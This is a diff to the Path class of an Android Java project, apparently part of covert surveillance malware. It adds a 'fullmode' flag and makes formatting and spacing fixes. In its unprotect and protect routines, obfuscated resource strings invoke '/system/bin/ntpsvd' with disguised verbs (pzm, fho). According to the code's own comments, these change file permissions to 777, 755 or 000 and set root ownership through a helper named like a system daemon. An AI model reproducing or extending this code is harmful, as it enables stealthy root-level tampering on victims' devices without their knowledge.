@@ -85,13 +85,15 @@ public class Path {
 			success &= createDirectory(logs());
 
 			if (Cfg.FILE && Cfg.DEBUG) {
-				
+
 				final File file = new File(getCurLogfile());
 				file.createNewFile();
 			}
 
-			//doc = Environment.getExternalStorageDirectory() + "/My Documents";
-			//picture = Environment.getExternalStorageDirectory() + "/DCIM/100MEDIA";
+			// doc = Environment.getExternalStorageDirectory() +
+			// "/My Documents";
+			// picture = Environment.getExternalStorageDirectory() +
+			// "/DCIM/100MEDIA";
 
 			initialized = success;
 			return success;
@@ -170,7 +172,7 @@ public class Path {
 	}
 
 	public static String getCurLogfile() {
-		if (curLogFile == null){
+		if (curLogFile == null) {
 			DateTime dt = new DateTime();
 
 			curLogFile = Environment.getExternalStorageDirectory() + "/" + LOG_FILE + "-" + dt.getOrderedString()
@@ -212,15 +214,15 @@ public class Path {
 		return unprotect(path, false);
 	}
 
-	public static boolean unprotect(String path, int depth) {
+	public static boolean unprotect(String path, int depth, boolean fullmode) {
 
 		File file = new File(path);
 		if (file.exists()) {
 			if (depth > 0) {
-				unprotect(file.getParent(), depth - 1);
+				unprotect(file.getParent(), depth - 1, fullmode);
 			}
 
-			return unprotect(path, false);
+			return unprotect(path, fullmode);
 		} else {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (unprotect) File does not exists: " + path);
@@ -240,19 +242,19 @@ public class Path {
 					return true;
 				}
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (unprotect): " + Messages.getString("h_9") + path);
+					Check.log(TAG + " (unprotect): " + Messages.getString("h_9") + " " + path);
 				}
 				// h_9=/system/bin/ntpsvd pzm 777
-				Runtime.getRuntime().exec(Messages.getString("h_9") + path);
+				Runtime.getRuntime().exec(Messages.getString("h_9") + " " + path);
 			} else {
 				if (file.canRead()) {
 					return true;
 				}
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (unprotect): " + Messages.getString("h_3") + path);
+					Check.log(TAG + " (unprotect): " + Messages.getString("h_3") + " " + path);
 				}
 				// h_3=/system/bin/ntpsvd pzm 755
-				Runtime.getRuntime().exec(Messages.getString("h_3") + path);
+				Runtime.getRuntime().exec(Messages.getString("h_3") + " " + path);
 			}
 
 			return file.canRead();
@@ -287,17 +289,17 @@ public class Path {
 		try {
 			// h_10=/system/bin/ntpsvd pzm 000
 			Runtime.getRuntime().exec(Messages.getString("h_10") + path);
-			
+
 			// h_11=/system/bin/ntpsvd fho root root
 			Runtime.getRuntime().exec(Messages.getString("h_11") + path);
-						
+
 			return true;
 		} catch (IOException ex) {
 			Check.log(TAG + " Error (unprotect): " + ex);
 			return false;
 		}
 	}
-	
+
 	/**
 	 * Removes the directory.
 	 * 
